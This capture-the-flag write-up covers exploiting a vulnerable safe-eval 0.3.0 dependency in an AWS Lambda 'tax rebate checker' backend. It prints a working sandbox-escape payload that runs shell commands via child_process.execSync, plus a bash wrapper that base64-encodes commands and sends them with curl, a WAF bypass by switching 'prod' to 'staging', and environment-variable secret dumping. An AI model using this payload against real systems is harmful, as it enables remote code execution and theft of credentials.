# Hold the line! Perimeter defences doing it's work!
**2000 Points // 2 Solves**

Apparently, the lead engineer left the company ("Safe Online Technologies"). He was a talented engineer and worked on many projects relating to Smart City. He goes by the handle `c0v1d-agent-1`. Everyone didn't know what this meant until COViD struck us by surprise. We received a tip-off from his colleagues that he has been using vulnerable code segments in one of a project he was working on! Can you take a look at his latest work and determine the impact of his actions! Let us know if such an application can be exploited!  
[Tax rebate checker](http://z8ggp.tax-rebate-checker.cf/)

## A First Look
This time, the frontend was hosted on Google Cloud Platform: 

Unfortunately, it's not the most factually accurate or exciting page...

![The Site](site.png)

_You can literally only type anything satisfying `([0-9e])+`._

Clearly, the challenge does not intend for us to exploit the front-end of the website. So we have to exploit the back-end(duh).

But to exploit the back-end, we need to find/leak the source code for any files or APIs. Where do we go to find such a thing?

## Preliminary Reconnaissance

Taking a look at the problem statement, we see that the engineer that worked on this had went by the handle `c0v1d-agent-1`.

So we searched the handle up on GitHub and...

![Found](user.png)

Bingo.

## Finding the Exploit

Before we exploit the page, we must first **find** the exploit.

### Backend Reconnaissance

To look for any API calls (We are using Chrome/Firefox), go to:

- (Chrome) "Developer Tools" -> "Network" tab 
- (Firefox) idk @sheepymeh

Send a bogus request like so:

![bogus request](bogus.png)

Et voilá!

![bogus response](bogus_resp.png)

From this bogus request, we can see that the website sends a POST request to

```
https://cors-anywhere.herokuapp.com/ <- (this part is not important)

https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/prod/tax-rebate-checker <- (this part is very important)
```

Immediately, we can deduce that:

- The backend is hosted on [AWS](https://aws.amazon.com/api-gateway/)
- [AWS Lambda](https://aws.amazon.com/lambda/) is the backend handler.

### Diving into Github

In grabbing information from Github, we found something really interesting:
![interesting](interesting.png)

We now know that:

- There is a vulnerable library being used.
- If we change the API URL from 'prod' to 'staging', we can just circumvent WAF (to add: a more in-depth explanation of "what is WAF?")

As the application was running on Node.js, we can find the dependencies in `package.json`:

```json
{
  "name": "pension-shecker-lambda",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC",
  "dependencies": {
    "safe-eval": "^0.3.0"
  }
}
```

Despite it's name literally saying `safe`, we are pretty sure `c0v1d-agent-1` was talking about `safe-eval`.

Sure enough, `safe-eval 0.3.0` has a [critical vulnerability](https://github.com/hacksparrow/safe-eval/issues/5) to be exploited. (to add: explain what the person is doing. why does this bypass safe-eval?)

## Exploiting the Exploit

To recap, we just need to switch from `prod` to `staging` in the API URL, to bypass the WAF: https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/staging/tax-rebate-checker. _(easiest WAF bypass on earth: done)_

From `index.js`, we can see that the [vulnerable line](https://github.com/c0v1d-agent-1/tax-rebate-checker/blob/main/index.js#L13) uses:

```js
safeEval((new Buffer(body.age, 'base64')).toString('ascii') + " + " + (new Buffer(body.salary, 'base64')).toString('ascii') + " * person.code",context);
```

This means that:

- We have to put our payload in `body.age` (or else Node.js will screw up our exploit) (to add: can you show how it will screw up our exploit?) `
_note that doing this the other way round (payload in salary) does not work syntactically. either a leading "+" will be present, or the eval will return the value of the sum instead_`
- Whatever values for `body.age` and `body.salary` we have to pass in needs to be in base64.

Hence, our payload wrapper would look like this:

```js
{
    "age": new Buffer(`<PAYLOAD>//`, "ascii").toString("base64"),
    "salary": "any value will do here since it's commented either way"
}
```

We found an example payload [here](https://snyk.io/vuln/SNYK-JS-SAFEEVAL-608076), but it did not work for AWS's newer version of Node.js (later determined to be Node.js 12.19.0 with `node --version`). We dug a bit deeper in the GitHub issues and found an [updated payload to use](https://github.com/hacksparrow/safe-eval/issues/18#issuecomment-592644871).  (to add: explain how this exploit works)

We just need to replace `whoami` with our preferred shell command to run arbitrary commands.

## Finding the flag
_([skip to solution](#solution))_ (hmm, should this be here?)

Now we are in the Lambda function, RCE in hand. However, no hints were given about where the flag was located.

To avoid wasting time, we drew up a shell file to perform any command we wanted quickly:
```bash
ste="(function (){delete this.constructor;const HostObject = this.constructor;const HostFunction = HostObject.is.constructor;const process = HostFunction('return process')();return process.mainModule.require('child_process').execSync('COMMAND').toString();})()//"

echo -n "Command? "
read rep

wow=$(echo -n "${ste/COMMAND/$rep}" | base64 | tr -d " \t\n\r")

curl https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/staging/tax-rebate-checker --data '{"age":'\"$wow\"',"salary":"123"}' -H 'Content-Type: application/json'
```

Essentially all we did was:

- Input any command we want (well... not [really](#Appendix-A) )

First we suspected that the file might have been part of the Lambda deployment package. We knew that Lambda only allows [functions to write to `/tmp` (during execution)](https://forums.aws.amazon.com/thread.jspa?threadID=174119), and [Lambda Layers are written to `/opt`](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html). 

When `ls` on these two directories did not succeed, we tried `ls -R` (recursive) on the root directory, but quickly hit the [default execution time limit of 3s](https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-limits.html).

Next, we tried to use SSRF to use the [metadata service](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/) available on AWS. (to be written)

### Solution
Finally, it hit us that environment variables existed. **GROUNDBREAKING DISCOVERY**.

This is where Lambda functions commonly store secrets and configuration data:

![Environment variables used in Lambda](env.png)

In order to print this out, we decided to use the `printenv` command.

```
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
flag=3nv_L0oK$-G$$D!
...
```

## Flag
```
govtech-csg{3nv_L0oK$-G$$D!}
```


Not sure if you still need this.

```
$ curl -v http://z8ggp.tax-rebate-checker.cf/
...
< HTTP/1.1 200 OK
< X-GUploader-UploadID: ABg5-UwbFLtFsPubVCx8sxKMuCR8qsX1ZzoCw8DiaG34sDXnnUs7YZ7T2c-MbLkoUOUn-ztbbri2R6ZYZ8zX_eL1hzc
< x-goog-generation: 1606418262624802
< x-goog-metageneration: 1
< x-goog-stored-content-encoding: identity
< x-goog-stored-content-length: 774
< x-goog-hash: crc32c=mMvjHQ==
< x-goog-hash: md5=wVoFqiGGeVXoDandOpY2SA==
< x-goog-storage-class: STANDARD
< Server: UploadServer
...
```

## Appendix A
We initially tried a lot of commands like `find` etc. However, we noticed that they couldn't be found.

Being curious and also rather intellectually challenged, we decided to look up all the commands with `ls /usr/bin`.

After some clean-up, we ended up with:
```
alias arch awk base64 basename bash bashbug bashbug-64 bg 
ca-legacy captoinfo cat catchsegv cd chcon chgrp chmod chown cksum 
clear comm command cp csplit cut date dd df dgawk dir dircolors 
dirname du echo egrep env expand expr factor false fc fg fgrep fmt 
fold gawk gencat getconf getent getopts grep groups head hostid 
iconv id igawk info infocmp infokey infotocap install jobs join 
ldd link ln locale localedef logname ls makedb md5sum mkdir mkfifo 
mknod mktemp mv nice nl nohup nproc numfmt od p11-kit paste 
pathchk pgawk pinky pldd pr printenv printf ptx pwd read readlink 
realpath reset rm rmdir rpcgen runcon sed seq sh sha1sum sha224sum 
sha256sum sha384sum sha512sum shred shuf sleep sort sotruss split 
sprof stat stdbuf stty sum sync tabs tac tail tee test tic timeout 
toe touch tput tr true truncate trust tset tsort tty tzselect 
umask unalias uname unexpand uniq unlink update-ca-trust users 
vdir wait wc who whoami yes 
```

**Interesting.**